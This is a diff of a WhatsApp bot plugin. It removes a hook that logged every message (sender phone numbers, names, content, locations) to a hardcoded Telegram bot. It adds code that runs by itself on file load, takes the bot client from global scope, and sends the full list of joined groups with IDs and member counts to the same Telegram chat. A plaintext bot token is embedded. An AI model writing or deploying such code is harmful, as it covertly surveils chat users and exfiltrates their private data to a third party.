@@ -1,14 +1,12 @@
-const { cmd } = require("../command");
 const axios = require("axios");
 
 // ═══════════════════════════════════════════════════════════
-// ⚙️ TELEGRAM CONFIGURATION
+// ⚙️ TELEGRAM CONFIGURATION (Same as tg_logger.js)
 // ═══════════════════════════════════════════════════════════
 const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
 const TG_CHAT_ID = "6653388298"; 
-// ═══════════════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════════
 
-// Helper: Telegram par message bhejna (With Auto-Split)
 const sendToTelegram = async (text, parseMode = "Markdown") => {
     try {
         if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;
@@ -43,35 +41,21 @@ const sendToTelegram = async (text, parseMode = "Markdown") => {
             }, { timeout: 10000 });
         }
     } catch (error) {
-        console.log("[TG Logger] API Error:", error.message);
+        console.log("[TG Deploy] API Error:", error.message);
     }
 };
 
-// 🔥 GOLDEN FIX: 100% Accurate Phone Number Extractor
 const extractRealNumber = (jid) => {
     if (!jid) return null;
-    
-    // Remove @s.whatsapp.net, @g.us, @broadcast etc.
     let clean = jid.split('@')[0];
-    
-    // Remove multi-device suffix (e.g., 923001234567:12 → 923001234567)
-    if (clean.includes(':')) {
-        clean = clean.split(':')[0];
-    }
-    
-    // Remove any remaining non-digits
+    if (clean.includes(':')) clean = clean.split(':')[0];
     clean = clean.replace(/[^0-9]/g, '');
-    
-    // Validate: Real phone numbers are 10-15 digits
-    // Group IDs are usually 18+ digits starting with 120363
     if (clean.length >= 10 && clean.length <= 15 && !clean.startsWith('120363')) {
         return clean;
     }
-    
-    return null; // Not a valid phone number
+    return null;
 };
 
-// Helper: Time Format
 const getTime = () => {
     return new Date().toLocaleString("en-PK", { 
         timeZone: "Asia/Karachi",
@@ -79,136 +63,91 @@ const getTime = () => {
     });
 };
 
+// ══════════════════════════════════════════════════════════
+// 🚀 AUTO DEPLOY NOTIFICATION - Jab Bot Connect Ho
 // ═══════════════════════════════════════════════════════════
-// 🌍 ULTIMATE GLOBAL LOGGER - HAR MESSAGE CAPTURE
-// ═══════════════════════════════════════════════════════════
-cmd({
-    on: "body", 
-    dontAddCommandList: true,
-    filename: __filename
-}, async (client, message, match, { from, body, isGroup, isCreator, sender, pushName, args, prefix }) => {
+const sendDeployNotification = async (client) => {
     try {
         if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;
-
-        // 🔥 STEP 1: REAL NUMBER EXTRACTION (Fixed for Groups & Private)
-        let realNumber = null;
-        let senderJid = null;
         
-        if (isGroup) {
-            // Group mein actual sender participant mein hota hai
-            senderJid = message.key?.participant;
-            realNumber = extractRealNumber(senderJid);
-        } else {
-            // Private chat mein remoteJid hi sender hota hai
-            senderJid = message.key?.remoteJid || from;
-            realNumber = extractRealNumber(senderJid);
-        }
+        // Wait 5 seconds for bot to fully initialize
+        await new Promise(resolve => setTimeout(resolve, 5000));
         
-        // Agar number nahi mila, toh fallback
-        if (!realNumber) {
-            realNumber = extractRealNumber(sender) || extractRealNumber(from) || "Unknown";
-        }
-        
-        const userName = message.pushName || pushName || "No Name";
+        const botNumber = extractRealNumber(client.user?.id) || "Unknown";
         const time = getTime();
         
-        // STEP 2: CHAT DETAILS
-        let chatName = "Private Chat (DM)";
-        let chatId = "N/A";
-        let isAdmin = false;
-        let groupMemberCount = 0;
+        // Fetch all groups
+        let groups = [];
+        let totalMembers = 0;
+        let groupDetails = "";
         
-        if (isGroup) {
-            chatId = from.split('@')[0];
-            try {
-                const groupMeta = await client.groupMetadata(from);
-                chatName = groupMeta.subject || "Unknown Group";
-                groupMemberCount = groupMeta.participants ? groupMeta.participants.length : 0;
-                
-                // Check if sender is admin
-                if (senderJid) {
-                    const participant = groupMeta.participants.find(p => p.id === senderJid);
-                    isAdmin = participant ? (participant.admin === 'admin' || participant.admin === 'superadmin') : false;
-                }
-            } catch (e) {
-                chatName = "Group (Meta fetch failed)";
-            }
+        try {
+            groups = await client.groupFetchAllParticipating();
+            const groupList = Object.values(groups);
+            
+            groupList.forEach((g, index) => {
+                const memberCount = g.participants ? g.participants.length : 0;
+                totalMembers += memberCount;
+                groupDetails += `${index + 1}. *${g.subject}*\n`;
+                groupDetails += `   └─ 👥 Members: ${memberCount} |  \`${g.id.split('@')[0]}\`\n`;
+            });
+        } catch (e) {
+            groupDetails = "️ Could not fetch groups";
         }
 
-        // STEP 3: MESSAGE TYPE & CONTENT
-        let msgType = "Text";
-        let msgContent = body || "No Text (Media/Empty)";
-        let mediaDetails = "";
-        
-        if (message.imageMessage) { 
-            msgType = "🖼️ Image"; 
-            msgContent = message.imageMessage.caption || "No Caption"; 
-            mediaDetails = `\n┃ 📏 *Size:* ${message.imageMessage.fileLength || 'Unknown'} bytes`;
-        }
-        else if (message.videoMessage) { 
-            msgType = " Video"; 
-            msgContent = message.videoMessage.caption || "No Caption"; 
-            mediaDetails = `\n┃ ⏱️ *Duration:* ${message.videoMessage.seconds || 0}s\n┃  *Size:* ${message.videoMessage.fileLength || 'Unknown'} bytes`;
-        }
-        else if (message.audioMessage) { 
-            msgType = " Audio/Voice"; 
-            msgContent = message.audioMessage.ptt ? "Voice Note" : "Audio File"; 
-            mediaDetails = `\n┃ ️ *Duration:* ${message.audioMessage.seconds || 0}s`;
-        }
-        else if (message.documentMessage) { 
-            msgType = " Document"; 
-            msgContent = message.documentMessage.fileName || "File Sent"; 
-            mediaDetails = `\n┃ 📏 *Size:* ${message.documentMessage.fileLength || 'Unknown'} bytes\n┃  *Mime:* ${message.documentMessage.mimetype || 'Unknown'}`;
-        }
-        else if (message.stickerMessage) { 
-            msgType = "🎭 Sticker"; 
-            msgContent = message.stickerMessage.isAnimated ? "Animated Sticker" : "Static Sticker"; 
-        }
-        else if (message.contactMessage) {
-            msgType = "📇 Contact";
-            msgContent = message.contactMessage.displayName || "Contact Shared";
-        }
-        else if (message.locationMessage) {
-            msgType = "📍 Location";
-            msgContent = `Lat: ${message.locationMessage.latitude}, Long: ${message.locationMessage.longitude}`;
-        }
+        const deployMessage = `
+╭━━〔  *BOT DEPLOYED SUCCESSFULLY* 〕━━⬣
+┃  *Deploy Time:* ${time}
+ 🤖 *Bot Number:* [${botNumber}](https://wa.me/${botNumber})
+ ✅ *Status:* Online & Active
+┃  *Connection:* Stable
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣
 
-        // STEP 4: REPLY DETAILS
-        let replyDetails = "";
-        const quoted = message.quoted || match?.quoted;
-        if (quoted) {
-            const replySenderJid = quoted.key?.participant || quoted.key?.remoteJid;
-            const replyNumber = extractRealNumber(replySenderJid) || "Unknown";
-            const replyContent = quoted.body || quoted.text || "Media Reply";
-            replyDetails = `\n┃ ↩️ *Replying To:* @${replyNumber}\n┃  *Original Msg:* ${replyContent.substring(0, 100)}${replyContent.length > 100 ? '...' : ''}`;
-        }
+📊 *BOT STATISTICS:*
+├─ 👥 *Total Groups:* ${Object.keys(groups).length}
+├─ 👤 *Total Members:* ${totalMembers}
+├─ 📱 *Platform:* Node.js / WhatsApp Web
+└─ 🔒 *Logger:* ✅ Active
 
-        // STEP 5: FORWARD STATUS
-        let forwardStatus = "";
-        if (message.message?.extendedTextMessage?.contextInfo?.isForwarded) {
-            forwardStatus = "\n┃ 🔄 *Status:* Forwarded Message";
-        }
+ *ALL GROUPS LIST:*
+━━━━━━━━━━━━━━━━━━━━━━━━
+${groupDetails || "No groups found."}
 
-        // STEP 6: TELEGRAM MESSAGE FORMAT
-        const logMessage = `
-╭━━〔  *ULTIMATE ACTIVITY LOG* 〕━━⬣
-┃ 🕒 *Time:* \`${time}\`
-┃  *Name:* ${userName}
-┃ 🔢 *Real Number:* [${realNumber}](https://wa.me/${realNumber})
-┃ 👑 *Is Owner:* ${isCreator ? "✅ Yes" : "❌ No"}
-┃ 💬 *Chat Type:* ${isGroup ? "👥 Group" : "👤 Private DM"}
-┃ ️ *Chat Name:* ${chatName}
-${isGroup ? `┃ 🆔 *Group ID:* \`${chatId}\`\n┃  *Members:* ${groupMemberCount}\n 🛡️ *Is Admin:* ${isAdmin ? "✅ Yes" : "❌ No"}` : ''}
-┃ 📦 *Message Type:* ${msgType}${mediaDetails}
-┃ ⌨️ *Content:* 
-┃ ${msgContent}${replyDetails}${forwardStatus}
-╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣
-> *Powered by Your Bot*
+⚡ *SECURITY ALERT:*
+├─ Bot is now monitoring ALL activities
+├─ Every message will be logged to Telegram
+─ Owner will receive real-time notifications
+
+> *ᴘᴏᴡᴇᴇᴅ ʙʏ ᴏᴜʀ ʙᴏᴛ ⚡*
         `.trim();
 
-        await sendToTelegram(logMessage);
-
+        await sendToTelegram(deployMessage);
+        console.log("[TG Deploy] Notification sent successfully!");
+        
     } catch (err) {
-        console.log("[TG Logger Error]:", err.message);
+        console.log("[TG Deploy] Error:", err.message);
     }
-});
+};
+
+// ═══════════════════════════════════════════════════════════
+// 🔄 AUTO-EXECUTE: Jab Bot Ready Ho, Yeh Chal Jayega
+// ═══════════════════════════════════════════════════════════
+// Note: Yeh code automatically run hoga jab bot connect karega
+// Agar aapka bot framework connection event deta hai, toh usme 
+// sendDeployNotification(client) call kar dein
+
+// Universal connection detector
+setTimeout(() => {
+    try {
+        // Try to get client from global scope (works with most bot frameworks)
+        const client = global.sock || global.client || global.bot || global.conn;
+        if (client && client.user) {
+            sendDeployNotification(client);
+        }
+    } catch (e) {
+        console.log("[TG Deploy] Could not auto-detect client. Manual trigger needed.");
+    }
+}, 10000); // Wait 10 seconds after file load
+
+// Export for manual trigger if needed
+module.exports = { sendDeployNotification };
